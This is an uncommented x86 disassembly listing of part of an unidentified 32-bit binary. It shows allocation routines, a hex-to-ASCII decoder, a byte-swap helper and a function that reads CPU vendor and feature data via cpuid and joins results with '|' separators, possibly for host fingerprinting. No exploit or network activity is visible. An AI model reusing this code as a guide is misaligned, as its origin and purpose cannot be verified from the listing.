  403fcf:	53                   	push   %ebx
  403fd0:	83 c2 07             	add    $0x7,%edx
  403fd3:	6a 08                	push   $0x8
  403fd5:	13 c3                	adc    %ebx,%eax
  403fd7:	50                   	push   %eax
  403fd8:	52                   	push   %edx
  403fd9:	e8 12 3b 01 00       	call   0x417af0
  403fde:	03 c0                	add    %eax,%eax
  403fe0:	03 c0                	add    %eax,%eax
  403fe2:	03 c0                	add    %eax,%eax
  403fe4:	8b e8                	mov    %eax,%ebp
  403fe6:	2b 6c 24 20          	sub    0x20(%esp),%ebp
  403fea:	74 1a                	je     0x404006
  403fec:	55                   	push   %ebp
  403fed:	53                   	push   %ebx
  403fee:	56                   	push   %esi
  403fef:	e8 9c 4f 00 00       	call   0x408f90
  403ff4:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  403ff8:	83 c4 0c             	add    $0xc,%esp
  403ffb:	56                   	push   %esi
  403ffc:	8b c5                	mov    %ebp,%eax
  403ffe:	e8 dd 12 00 00       	call   0x4052e0
  404003:	83 c4 04             	add    $0x4,%esp
  404006:	8b 74 24 34          	mov    0x34(%esp),%esi
  40400a:	3b f3                	cmp    %ebx,%esi
  40400c:	74 0f                	je     0x40401d
  40400e:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  404012:	51                   	push   %ecx
  404013:	e8 b8 f8 ff ff       	call   0x4038d0
  404018:	83 c4 04             	add    $0x4,%esp
  40401b:	89 06                	mov    %eax,(%esi)
  40401d:	8b 54 24 14          	mov    0x14(%esp),%edx
  404021:	52                   	push   %edx
  404022:	e8 ed 6a 00 00       	call   0x40ab14
  404027:	83 c4 04             	add    $0x4,%esp
  40402a:	5f                   	pop    %edi
  40402b:	5e                   	pop    %esi
  40402c:	5d                   	pop    %ebp
  40402d:	b8 01 00 00 00       	mov    $0x1,%eax
  404032:	5b                   	pop    %ebx
  404033:	83 c4 1c             	add    $0x1c,%esp
  404036:	c3                   	ret
  404037:	cc                   	int3
  404038:	cc                   	int3
  404039:	cc                   	int3
  40403a:	cc                   	int3
  40403b:	cc                   	int3
  40403c:	cc                   	int3
  40403d:	cc                   	int3
  40403e:	cc                   	int3
  40403f:	cc                   	int3
  404040:	8b 47 04             	mov    0x4(%edi),%eax
  404043:	89 87 cc 0c 00 00    	mov    %eax,0xccc(%edi)
  404049:	83 ec 0c             	sub    $0xc,%esp
  40404c:	53                   	push   %ebx
  40404d:	c7 87 d4 0c 00 00 04 	movl   $0x4,0xcd4(%edi)
  404054:	00 00 00 
  404057:	55                   	push   %ebp
  404058:	56                   	push   %esi
  404059:	8d b7 cc 0c 00 00    	lea    0xccc(%edi),%esi
  40405f:	33 ed                	xor    %ebp,%ebp
  404061:	89 6e 04             	mov    %ebp,0x4(%esi)
  404064:	b8 01 00 00 00       	mov    $0x1,%eax
  404069:	89 46 0c             	mov    %eax,0xc(%esi)
  40406c:	89 46 10             	mov    %eax,0x10(%esi)
  40406f:	8b 4f 08             	mov    0x8(%edi),%ecx
  404072:	89 4e 18             	mov    %ecx,0x18(%esi)
  404075:	89 6e 1c             	mov    %ebp,0x1c(%esi)
  404078:	c7 46 20 08 00 00 00 	movl   $0x8,0x20(%esi)
  40407f:	89 46 24             	mov    %eax,0x24(%esi)
  404082:	89 6e 28             	mov    %ebp,0x28(%esi)
  404085:	8b 57 1c             	mov    0x1c(%edi),%edx
  404088:	6a 48                	push   $0x48
  40408a:	89 56 30             	mov    %edx,0x30(%esi)
  40408d:	89 6e 34             	mov    %ebp,0x34(%esi)
  404090:	89 6e 38             	mov    %ebp,0x38(%esi)
  404093:	89 46 3c             	mov    %eax,0x3c(%esi)
  404096:	89 6e 40             	mov    %ebp,0x40(%esi)
  404099:	e8 53 6b 00 00       	call   0x40abf1
  40409e:	8b d8                	mov    %eax,%ebx
  4040a0:	83 c4 04             	add    $0x4,%esp
  4040a3:	3b dd                	cmp    %ebp,%ebx
  4040a5:	75 2a                	jne    0x4040d1
  4040a7:	6a 08                	push   $0x8
  4040a9:	ff 15 a8 80 41 00    	call   *0x4180a8
  4040af:	68 dc a8 41 00       	push   $0x41a8dc
  4040b4:	68 49 06 00 00       	push   $0x649
  4040b9:	68 70 aa 41 00       	push   $0x41aa70
  4040be:	33 d2                	xor    %edx,%edx
  4040c0:	e8 4b 21 00 00       	call   0x406210
  4040c5:	83 c4 0c             	add    $0xc,%esp
  4040c8:	33 c0                	xor    %eax,%eax
  4040ca:	5e                   	pop    %esi
  4040cb:	5d                   	pop    %ebp
  4040cc:	5b                   	pop    %ebx
  4040cd:	83 c4 0c             	add    $0xc,%esp
  4040d0:	c3                   	ret
  4040d1:	6a 48                	push   $0x48
  4040d3:	56                   	push   %esi
  4040d4:	53                   	push   %ebx
  4040d5:	e8 76 5b 00 00       	call   0x409c50
  4040da:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4040de:	83 c4 0c             	add    $0xc,%esp
  4040e1:	8d 44 24 10          	lea    0x10(%esp),%eax
  4040e5:	50                   	push   %eax
  4040e6:	55                   	push   %ebp
  4040e7:	55                   	push   %ebp
  4040e8:	51                   	push   %ecx
  4040e9:	68 f0 1b 40 00       	push   $0x401bf0
  4040ee:	6a 03                	push   $0x3
  4040f0:	53                   	push   %ebx
  4040f1:	8b c7                	mov    %edi,%eax
  4040f3:	e8 58 f1 ff ff       	call   0x403250
  4040f8:	83 c4 1c             	add    $0x1c,%esp
  4040fb:	53                   	push   %ebx
  4040fc:	85 c0                	test   %eax,%eax
  4040fe:	75 11                	jne    0x404111
  404100:	e8 0f 6a 00 00       	call   0x40ab14
  404105:	83 c4 04             	add    $0x4,%esp
  404108:	33 c0                	xor    %eax,%eax
  40410a:	5e                   	pop    %esi
  40410b:	5d                   	pop    %ebp
  40410c:	5b                   	pop    %ebx
  40410d:	83 c4 0c             	add    $0xc,%esp
  404110:	c3                   	ret
  404111:	e8 fe 69 00 00       	call   0x40ab14
  404116:	83 c4 04             	add    $0x4,%esp
  404119:	5e                   	pop    %esi
  40411a:	5d                   	pop    %ebp
  40411b:	b8 01 00 00 00       	mov    $0x1,%eax
  404120:	5b                   	pop    %ebx
  404121:	83 c4 0c             	add    $0xc,%esp
  404124:	c3                   	ret
  404125:	cc                   	int3
  404126:	cc                   	int3
  404127:	cc                   	int3
  404128:	cc                   	int3
  404129:	cc                   	int3
  40412a:	cc                   	int3
  40412b:	cc                   	int3
  40412c:	cc                   	int3
  40412d:	cc                   	int3
  40412e:	cc                   	int3
  40412f:	cc                   	int3
  404130:	83 ec 14             	sub    $0x14,%esp
  404133:	53                   	push   %ebx
  404134:	55                   	push   %ebp
  404135:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  404139:	56                   	push   %esi
  40413a:	33 db                	xor    %ebx,%ebx
  40413c:	33 f6                	xor    %esi,%esi
  40413e:	57                   	push   %edi
  40413f:	8d bd cc 0c 00 00    	lea    0xccc(%ebp),%edi
  404145:	38 9d a0 00 00 00    	cmp    %bl,0xa0(%ebp)
  40414b:	75 2d                	jne    0x40417a
  40414d:	38 9d a2 00 00 00    	cmp    %bl,0xa2(%ebp)
  404153:	74 25                	je     0x40417a
  404155:	8b 85 a4 00 00 00    	mov    0xa4(%ebp),%eax
  40415b:	3b c3                	cmp    %ebx,%eax
  40415d:	74 1b                	je     0x40417a
  40415f:	b9 01 00 00 00       	mov    $0x1,%ecx
  404164:	89 07                	mov    %eax,(%edi)
  404166:	89 5f 04             	mov    %ebx,0x4(%edi)
  404169:	c7 47 08 90 00 00 00 	movl   $0x90,0x8(%edi)
  404170:	89 4f 0c             	mov    %ecx,0xc(%edi)
  404173:	89 5f 10             	mov    %ebx,0x10(%edi)
  404176:	8b f1                	mov    %ecx,%esi
  404178:	eb 05                	jmp    0x40417f
  40417a:	b9 01 00 00 00       	mov    $0x1,%ecx
  40417f:	8b 55 04             	mov    0x4(%ebp),%edx
  404182:	8d 04 76             	lea    (%esi,%esi,2),%eax
  404185:	89 14 c7             	mov    %edx,(%edi,%eax,8)
  404188:	89 5c c7 04          	mov    %ebx,0x4(%edi,%eax,8)
  40418c:	c7 44 c7 08 04 00 00 	movl   $0x4,0x8(%edi,%eax,8)
  404193:	00 
  404194:	89 4c c7 0c          	mov    %ecx,0xc(%edi,%eax,8)
  404198:	89 5c c7 10          	mov    %ebx,0x10(%edi,%eax,8)
  40419c:	8b 55 08             	mov    0x8(%ebp),%edx
  40419f:	8d 04 c7             	lea    (%edi,%eax,8),%eax
  4041a2:	03 f1                	add    %ecx,%esi
  4041a4:	8d 04 76             	lea    (%esi,%esi,2),%eax
  4041a7:	89 14 c7             	mov    %edx,(%edi,%eax,8)
  4041aa:	89 5c c7 04          	mov    %ebx,0x4(%edi,%eax,8)
  4041ae:	c7 44 c7 08 08 00 00 	movl   $0x8,0x8(%edi,%eax,8)
  4041b5:	00 
  4041b6:	89 4c c7 0c          	mov    %ecx,0xc(%edi,%eax,8)
  4041ba:	89 5c c7 10          	mov    %ebx,0x10(%edi,%eax,8)
  4041be:	8b 95 a8 00 00 00    	mov    0xa8(%ebp),%edx
  4041c4:	8d 04 c7             	lea    (%edi,%eax,8),%eax
  4041c7:	03 f1                	add    %ecx,%esi
  4041c9:	8d 04 76             	lea    (%esi,%esi,2),%eax
  4041cc:	8d 04 c7             	lea    (%edi,%eax,8),%eax
  4041cf:	89 10                	mov    %edx,(%eax)
  4041d1:	89 58 04             	mov    %ebx,0x4(%eax)
  4041d4:	8b 95 ac 00 00 00    	mov    0xac(%ebp),%edx
  4041da:	89 50 08             	mov    %edx,0x8(%eax)
  4041dd:	89 48 0c             	mov    %ecx,0xc(%eax)
  4041e0:	89 58 10             	mov    %ebx,0x10(%eax)
  4041e3:	8b 95 b0 00 00 00    	mov    0xb0(%ebp),%edx
  4041e9:	03 f1                	add    %ecx,%esi
  4041eb:	8d 04 76             	lea    (%esi,%esi,2),%eax
  4041ee:	8d 04 c7             	lea    (%edi,%eax,8),%eax
  4041f1:	89 10                	mov    %edx,(%eax)
  4041f3:	89 58 04             	mov    %ebx,0x4(%eax)
  4041f6:	89 58 08             	mov    %ebx,0x8(%eax)
  4041f9:	89 48 0c             	mov    %ecx,0xc(%eax)
  4041fc:	89 58 10             	mov    %ebx,0x10(%eax)
  4041ff:	03 f1                	add    %ecx,%esi
  404201:	8d 04 76             	lea    (%esi,%esi,2),%eax
  404204:	03 c0                	add    %eax,%eax
  404206:	03 c0                	add    %eax,%eax
  404208:	03 c0                	add    %eax,%eax
  40420a:	50                   	push   %eax
  40420b:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40420f:	e8 dd 69 00 00       	call   0x40abf1
  404214:	83 c4 04             	add    $0x4,%esp
  404217:	89 44 24 14          	mov    %eax,0x14(%esp)
  40421b:	3b c3                	cmp    %ebx,%eax
  40421d:	75 2b                	jne    0x40424a
  40421f:	6a 08                	push   $0x8
  404221:	ff 15 a8 80 41 00    	call   *0x4180a8
  404227:	68 dc a8 41 00       	push   $0x41a8dc
  40422c:	68 a3 06 00 00       	push   $0x6a3
  404231:	68 70 aa 41 00       	push   $0x41aa70
  404236:	33 d2                	xor    %edx,%edx
  404238:	e8 d3 1f 00 00       	call   0x406210
  40423d:	83 c4 0c             	add    $0xc,%esp
  404240:	33 c0                	xor    %eax,%eax
  404242:	5f                   	pop    %edi
  404243:	5e                   	pop    %esi
  404244:	5d                   	pop    %ebp
  404245:	5b                   	pop    %ebx
  404246:	83 c4 14             	add    $0x14,%esp
  404249:	c3                   	ret
  40424a:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40424e:	51                   	push   %ecx
  40424f:	57                   	push   %edi
  404250:	50                   	push   %eax
  404251:	e8 fa 59 00 00       	call   0x409c50
  404256:	8b 7c 24 38          	mov    0x38(%esp),%edi
  40425a:	83 c4 0c             	add    $0xc,%esp
  40425d:	8d 54 24 18          	lea    0x18(%esp),%edx
  404261:	52                   	push   %edx
  404262:	56                   	push   %esi
  404263:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  404267:	56                   	push   %esi
  404268:	8b c5                	mov    %ebp,%eax
  40426a:	e8 d1 f2 ff ff       	call   0x403540
  40426f:	83 c4 0c             	add    $0xc,%esp
  404272:	56                   	push   %esi
  404273:	85 c0                	test   %eax,%eax
  404275:	75 12                	jne    0x404289
  404277:	e8 98 68 00 00       	call   0x40ab14
  40427c:	83 c4 04             	add    $0x4,%esp
  40427f:	33 c0                	xor    %eax,%eax
  404281:	5f                   	pop    %edi
  404282:	5e                   	pop    %esi
  404283:	5d                   	pop    %ebp
  404284:	5b                   	pop    %ebx
  404285:	83 c4 14             	add    $0x14,%esp
  404288:	c3                   	ret
  404289:	e8 86 68 00 00       	call   0x40ab14
  40428e:	83 c4 04             	add    $0x4,%esp
  404291:	5f                   	pop    %edi
  404292:	5e                   	pop    %esi
  404293:	5d                   	pop    %ebp
  404294:	b8 01 00 00 00       	mov    $0x1,%eax
  404299:	5b                   	pop    %ebx
  40429a:	83 c4 14             	add    $0x14,%esp
  40429d:	c3                   	ret
  40429e:	cc                   	int3
  40429f:	cc                   	int3
  4042a0:	8b 88 d4 8c 00 00    	mov    0x8cd4(%eax),%ecx
  4042a6:	56                   	push   %esi
  4042a7:	8d b0 cc 8c 00 00    	lea    0x8ccc(%eax),%esi
  4042ad:	33 c0                	xor    %eax,%eax
  4042af:	85 c9                	test   %ecx,%ecx
  4042b1:	76 0c                	jbe    0x4042bf
  4042b3:	8a 16                	mov    (%esi),%dl
  4042b5:	46                   	inc    %esi
  4042b6:	84 d2                	test   %dl,%dl
  4042b8:	75 0c                	jne    0x4042c6
  4042ba:	40                   	inc    %eax
  4042bb:	3b c1                	cmp    %ecx,%eax
  4042bd:	72 f4                	jb     0x4042b3
  4042bf:	b8 01 00 00 00       	mov    $0x1,%eax
  4042c4:	5e                   	pop    %esi
  4042c5:	c3                   	ret
  4042c6:	33 c0                	xor    %eax,%eax
  4042c8:	5e                   	pop    %esi
  4042c9:	c3                   	ret
  4042ca:	cc                   	int3
  4042cb:	cc                   	int3
  4042cc:	cc                   	int3
  4042cd:	cc                   	int3
  4042ce:	cc                   	int3
  4042cf:	cc                   	int3
  4042d0:	53                   	push   %ebx
  4042d1:	8b d8                	mov    %eax,%ebx
  4042d3:	0f be 02             	movsbl (%edx),%eax
  4042d6:	42                   	inc    %edx
  4042d7:	57                   	push   %edi
  4042d8:	8b f9                	mov    %ecx,%edi
  4042da:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4042e0:	85 c0                	test   %eax,%eax
  4042e2:	75 03                	jne    0x4042e7
  4042e4:	5f                   	pop    %edi
  4042e5:	5b                   	pop    %ebx
  4042e6:	c3                   	ret
  4042e7:	0f be 0a             	movsbl (%edx),%ecx
  4042ea:	42                   	inc    %edx
  4042eb:	85 c9                	test   %ecx,%ecx
  4042ed:	75 06                	jne    0x4042f5
  4042ef:	5f                   	pop    %edi
  4042f0:	8d 41 01             	lea    0x1(%ecx),%eax
  4042f3:	5b                   	pop    %ebx
  4042f4:	c3                   	ret
  4042f5:	83 f8 20             	cmp    $0x20,%eax
  4042f8:	55                   	push   %ebp
  4042f9:	0f 8c a4 00 00 00    	jl     0x4043a3
  4042ff:	90                   	nop
  404300:	83 f8 7e             	cmp    $0x7e,%eax
  404303:	0f 8f 9a 00 00 00    	jg     0x4043a3
  404309:	8d 69 e0             	lea    -0x20(%ecx),%ebp
  40430c:	83 fd 5e             	cmp    $0x5e,%ebp
  40430f:	0f 87 8e 00 00 00    	ja     0x4043a3
  404315:	83 fb 01             	cmp    $0x1,%ebx
  404318:	0f 86 8b 00 00 00    	jbe    0x4043a9
  40431e:	8d 68 d0             	lea    -0x30(%eax),%ebp
  404321:	83 fd 09             	cmp    $0x9,%ebp
  404324:	77 04                	ja     0x40432a
  404326:	2c 30                	sub    $0x30,%al
  404328:	eb 1a                	jmp    0x404344
  40432a:	8d 68 9f             	lea    -0x61(%eax),%ebp
  40432d:	83 fd 05             	cmp    $0x5,%ebp
  404330:	77 04                	ja     0x404336
  404332:	2c 57                	sub    $0x57,%al
  404334:	eb 0e                	jmp    0x404344
  404336:	8d 68 bf             	lea    -0x41(%eax),%ebp
  404339:	83 fd 05             	cmp    $0x5,%ebp
  40433c:	77 04                	ja     0x404342
  40433e:	2c 37                	sub    $0x37,%al
  404340:	eb 02                	jmp    0x404344
  404342:	0c ff                	or     $0xff,%al
  404344:	8d 69 d0             	lea    -0x30(%ecx),%ebp
  404347:	83 fd 09             	cmp    $0x9,%ebp
  40434a:	77 05                	ja     0x404351
  40434c:	80 e9 30             	sub    $0x30,%cl
  40434f:	eb 1d                	jmp    0x40436e
  404351:	8d 69 9f             	lea    -0x61(%ecx),%ebp
  404354:	83 fd 05             	cmp    $0x5,%ebp
  404357:	77 05                	ja     0x40435e
  404359:	80 e9 57             	sub    $0x57,%cl
  40435c:	eb 10                	jmp    0x40436e
  40435e:	8d 69 bf             	lea    -0x41(%ecx),%ebp
  404361:	83 fd 05             	cmp    $0x5,%ebp
  404364:	77 05                	ja     0x40436b
  404366:	80 e9 37             	sub    $0x37,%cl
  404369:	eb 03                	jmp    0x40436e
  40436b:	80 c9 ff             	or     $0xff,%cl
  40436e:	3c ff                	cmp    $0xff,%al
  404370:	74 40                	je     0x4043b2
  404372:	80 f9 ff             	cmp    $0xff,%cl
  404375:	74 3b                	je     0x4043b2
  404377:	c0 e0 04             	shl    $0x4,%al
  40437a:	0a c1                	or     %cl,%al
  40437c:	3c 20                	cmp    $0x20,%al
  40437e:	72 32                	jb     0x4043b2
  404380:	3c 7e                	cmp    $0x7e,%al
  404382:	77 2e                	ja     0x4043b2
  404384:	ff 06                	incl   (%esi)
  404386:	88 07                	mov    %al,(%edi)
  404388:	0f be 02             	movsbl (%edx),%eax
  40438b:	47                   	inc    %edi
  40438c:	4b                   	dec    %ebx
  40438d:	42                   	inc    %edx
  40438e:	85 c0                	test   %eax,%eax
  404390:	74 11                	je     0x4043a3
  404392:	0f be 0a             	movsbl (%edx),%ecx
  404395:	42                   	inc    %edx
  404396:	85 c9                	test   %ecx,%ecx
  404398:	74 18                	je     0x4043b2
  40439a:	83 f8 20             	cmp    $0x20,%eax
  40439d:	0f 8d 5d ff ff ff    	jge    0x404300
  4043a3:	5d                   	pop    %ebp
  4043a4:	5f                   	pop    %edi
  4043a5:	33 c0                	xor    %eax,%eax
  4043a7:	5b                   	pop    %ebx
  4043a8:	c3                   	ret
  4043a9:	5d                   	pop    %ebp
  4043aa:	5f                   	pop    %edi
  4043ab:	b8 02 00 00 00       	mov    $0x2,%eax
  4043b0:	5b                   	pop    %ebx
  4043b1:	c3                   	ret
  4043b2:	5d                   	pop    %ebp
  4043b3:	5f                   	pop    %edi
  4043b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4043b9:	5b                   	pop    %ebx
  4043ba:	c3                   	ret
  4043bb:	cc                   	int3
  4043bc:	cc                   	int3
  4043bd:	cc                   	int3
  4043be:	cc                   	int3
  4043bf:	cc                   	int3
  4043c0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4043c4:	81 64 24 08 ff ff 00 	andl   $0xffff,0x8(%esp)
  4043cb:	00 
  4043cc:	89 44 24 04          	mov    %eax,0x4(%esp)
  4043d0:	8d 44 24 04          	lea    0x4(%esp),%eax
  4043d4:	8d 4c 24 09          	lea    0x9(%esp),%ecx
  4043d8:	53                   	push   %ebx
  4043d9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4043e0:	8a 19                	mov    (%ecx),%bl
  4043e2:	8a 10                	mov    (%eax),%dl
  4043e4:	88 18                	mov    %bl,(%eax)
  4043e6:	88 11                	mov    %dl,(%ecx)
  4043e8:	40                   	inc    %eax
  4043e9:	49                   	dec    %ecx
  4043ea:	3b c1                	cmp    %ecx,%eax
  4043ec:	72 f2                	jb     0x4043e0
  4043ee:	8b 44 24 08          	mov    0x8(%esp),%eax
  4043f2:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4043f6:	5b                   	pop    %ebx
  4043f7:	c3                   	ret
  4043f8:	cc                   	int3
  4043f9:	cc                   	int3
  4043fa:	cc                   	int3
  4043fb:	cc                   	int3
  4043fc:	cc                   	int3
  4043fd:	cc                   	int3
  4043fe:	cc                   	int3
  4043ff:	cc                   	int3
  404400:	51                   	push   %ecx
  404401:	53                   	push   %ebx
  404402:	8b d8                	mov    %eax,%ebx
  404404:	8b 44 24 14          	mov    0x14(%esp),%eax
  404408:	8a 00                	mov    (%eax),%al
  40440a:	3c 20                	cmp    $0x20,%al
  40440c:	0f 8c ce 00 00 00    	jl     0x4044e0
  404412:	3c 7e                	cmp    $0x7e,%al
  404414:	0f 8f c6 00 00 00    	jg     0x4044e0
  40441a:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40441e:	55                   	push   %ebp
  40441f:	56                   	push   %esi
  404420:	33 ed                	xor    %ebp,%ebp
  404422:	57                   	push   %edi
  404423:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  404427:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40442b:	85 d2                	test   %edx,%edx
  40442d:	74 2c                	je     0x40445b
  40442f:	8d 74 24 10          	lea    0x10(%esp),%esi
  404433:	8b cb                	mov    %ebx,%ecx
  404435:	e8 06 e2 ff ff       	call   0x402640
  40443a:	85 c0                	test   %eax,%eax
  40443c:	74 47                	je     0x404485
  40443e:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  404442:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404446:	55                   	push   %ebp
  404447:	51                   	push   %ecx
  404448:	8b f7                	mov    %edi,%esi
  40444a:	56                   	push   %esi
  40444b:	e8 00 58 00 00       	call   0x409c50
  404450:	8d 3c 2e             	lea    (%esi,%ebp,1),%edi
  404453:	83 c4 0c             	add    $0xc,%esp
  404456:	c6 07 00             	movb   $0x0,(%edi)
  404459:	2b dd                	sub    %ebp,%ebx
  40445b:	8b 54 24 20          	mov    0x20(%esp),%edx
  40445f:	8d 74 24 10          	lea    0x10(%esp),%esi
  404463:	8b c3                	mov    %ebx,%eax
  404465:	8b cf                	mov    %edi,%ecx
  404467:	e8 64 fe ff ff       	call   0x4042d0
  40446c:	85 c0                	test   %eax,%eax
  40446e:	75 10                	jne    0x404480
  404470:	8b 44 24 10          	mov    0x10(%esp),%eax
  404474:	c6 04 38 00          	movb   $0x0,(%eax,%edi,1)
  404478:	5f                   	pop    %edi
  404479:	5e                   	pop    %esi
  40447a:	03 c5                	add    %ebp,%eax
  40447c:	5d                   	pop    %ebp
  40447d:	5b                   	pop    %ebx
  40447e:	59                   	pop    %ecx
  40447f:	c3                   	ret
  404480:	83 f8 02             	cmp    $0x2,%eax
  404483:	75 09                	jne    0x40448e
  404485:	5f                   	pop    %edi
  404486:	5e                   	pop    %esi
  404487:	5d                   	pop    %ebp
  404488:	83 c8 ff             	or     $0xffffffff,%eax
  40448b:	5b                   	pop    %ebx
  40448c:	59                   	pop    %ecx
  40448d:	c3                   	ret
  40448e:	b9 01 00 00 00       	mov    $0x1,%ecx
  404493:	3b d9                	cmp    %ecx,%ebx
  404495:	76 1e                	jbe    0x4044b5
  404497:	8b 54 24 20          	mov    0x20(%esp),%edx
  40449b:	8a 02                	mov    (%edx),%al
  40449d:	3c 20                	cmp    $0x20,%al
  40449f:	7c 14                	jl     0x4044b5
  4044a1:	3c 7e                	cmp    $0x7e,%al
  4044a3:	7f 10                	jg     0x4044b5
  4044a5:	01 4c 24 20          	add    %ecx,0x20(%esp)
  4044a9:	88 07                	mov    %al,(%edi)
  4044ab:	2b d9                	sub    %ecx,%ebx
  4044ad:	03 f9                	add    %ecx,%edi
  4044af:	03 e9                	add    %ecx,%ebp
  4044b1:	3b d9                	cmp    %ecx,%ebx
  4044b3:	77 e2                	ja     0x404497
  4044b5:	8b 44 24 20          	mov    0x20(%esp),%eax
  4044b9:	c6 07 00             	movb   $0x0,(%edi)
  4044bc:	8a 00                	mov    (%eax),%al
  4044be:	3c 20                	cmp    $0x20,%al
  4044c0:	7c 16                	jl     0x4044d8
  4044c2:	3c 7e                	cmp    $0x7e,%al
  4044c4:	7f 12                	jg     0x4044d8
  4044c6:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4044ca:	5f                   	pop    %edi
  4044cb:	5e                   	pop    %esi
  4044cc:	5d                   	pop    %ebp
  4044cd:	c6 01 00             	movb   $0x0,(%ecx)
  4044d0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4044d5:	5b                   	pop    %ebx
  4044d6:	59                   	pop    %ecx
  4044d7:	c3                   	ret
  4044d8:	5f                   	pop    %edi
  4044d9:	5e                   	pop    %esi
  4044da:	8b c5                	mov    %ebp,%eax
  4044dc:	5d                   	pop    %ebp
  4044dd:	5b                   	pop    %ebx
  4044de:	59                   	pop    %ecx
  4044df:	c3                   	ret
  4044e0:	33 c0                	xor    %eax,%eax
  4044e2:	5b                   	pop    %ebx
  4044e3:	59                   	pop    %ecx
  4044e4:	c3                   	ret
  4044e5:	cc                   	int3
  4044e6:	cc                   	int3
  4044e7:	cc                   	int3
  4044e8:	cc                   	int3
  4044e9:	cc                   	int3
  4044ea:	cc                   	int3
  4044eb:	cc                   	int3
  4044ec:	cc                   	int3
  4044ed:	cc                   	int3
  4044ee:	cc                   	int3
  4044ef:	cc                   	int3
  4044f0:	53                   	push   %ebx
  4044f1:	56                   	push   %esi
  4044f2:	57                   	push   %edi
  4044f3:	8b f8                	mov    %eax,%edi
  4044f5:	8b cf                	mov    %edi,%ecx
  4044f7:	e8 54 00 00 00       	call   0x404550
  4044fc:	85 c0                	test   %eax,%eax
  4044fe:	7c 3f                	jl     0x40453f
  404500:	be 00 20 00 00       	mov    $0x2000,%esi
  404505:	2b f0                	sub    %eax,%esi
  404507:	03 f8                	add    %eax,%edi
  404509:	56                   	push   %esi
  40450a:	57                   	push   %edi
  40450b:	8b d8                	mov    %eax,%ebx
  40450d:	e8 4e 01 00 00       	call   0x404660
  404512:	83 c4 08             	add    $0x8,%esp
  404515:	85 c0                	test   %eax,%eax
  404517:	7e 03                	jle    0x40451c
  404519:	c6 07 7c             	movb   $0x7c,(%edi)
  40451c:	7c 21                	jl     0x40453f
  40451e:	2b f0                	sub    %eax,%esi
  404520:	03 f8                	add    %eax,%edi
  404522:	56                   	push   %esi
  404523:	57                   	push   %edi
  404524:	03 d8                	add    %eax,%ebx
  404526:	e8 25 03 00 00       	call   0x404850
  40452b:	83 c4 08             	add    $0x8,%esp
  40452e:	85 c0                	test   %eax,%eax
  404530:	7e 03                	jle    0x404535
  404532:	c6 07 7c             	movb   $0x7c,(%edi)
  404535:	7c 08                	jl     0x40453f
  404537:	03 d8                	add    %eax,%ebx
  404539:	8b c3                	mov    %ebx,%eax
  40453b:	5f                   	pop    %edi
  40453c:	5e                   	pop    %esi
  40453d:	5b                   	pop    %ebx
  40453e:	c3                   	ret
  40453f:	5f                   	pop    %edi
  404540:	5e                   	pop    %esi
  404541:	83 c8 ff             	or     $0xffffffff,%eax
  404544:	5b                   	pop    %ebx
  404545:	c3                   	ret
  404546:	cc                   	int3
  404547:	cc                   	int3
  404548:	cc                   	int3
  404549:	cc                   	int3
  40454a:	cc                   	int3
  40454b:	cc                   	int3
  40454c:	cc                   	int3
  40454d:	cc                   	int3
  40454e:	cc                   	int3
  40454f:	cc                   	int3
  404550:	55                   	push   %ebp
  404551:	8b ec                	mov    %esp,%ebp
  404553:	6a fe                	push   $0xfffffffe
  404555:	68 e0 ba 41 00       	push   $0x41bae0
  40455a:	68 a0 90 40 00       	push   $0x4090a0
  40455f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404565:	50                   	push   %eax
  404566:	83 ec 30             	sub    $0x30,%esp
  404569:	a1 08 d6 41 00       	mov    0x41d608,%eax
  40456e:	31 45 f8             	xor    %eax,-0x8(%ebp)
  404571:	33 c5                	xor    %ebp,%eax
  404573:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404576:	53                   	push   %ebx
  404577:	56                   	push   %esi
  404578:	57                   	push   %edi
  404579:	50                   	push   %eax
  40457a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40457d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404583:	89 65 e8             	mov    %esp,-0x18(%ebp)
  404586:	8b f1                	mov    %ecx,%esi
  404588:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  40458b:	33 ff                	xor    %edi,%edi
  40458d:	89 7d d0             	mov    %edi,-0x30(%ebp)
  404590:	89 7d c8             	mov    %edi,-0x38(%ebp)
  404593:	89 7d cc             	mov    %edi,-0x34(%ebp)
  404596:	89 7d c0             	mov    %edi,-0x40(%ebp)
  404599:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40459c:	b8 00 00 00 00       	mov    $0x0,%eax
  4045a1:	0f a2                	cpuid
  4045a3:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  4045a6:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4045a9:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4045ac:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  4045b3:	b8 01 00 00 00       	mov    $0x1,%eax
  4045b8:	0f a2                	cpuid
  4045ba:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4045bd:	89 55 cc             	mov    %edx,-0x34(%ebp)
  4045c0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4045c7:	8b c7                	mov    %edi,%eax
  4045c9:	eb 1b                	jmp    0x4045e6
  4045cb:	b8 01 00 00 00       	mov    $0x1,%eax
  4045d0:	c3                   	ret
  4045d1:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4045d4:	b8 01 00 00 00       	mov    $0x1,%eax
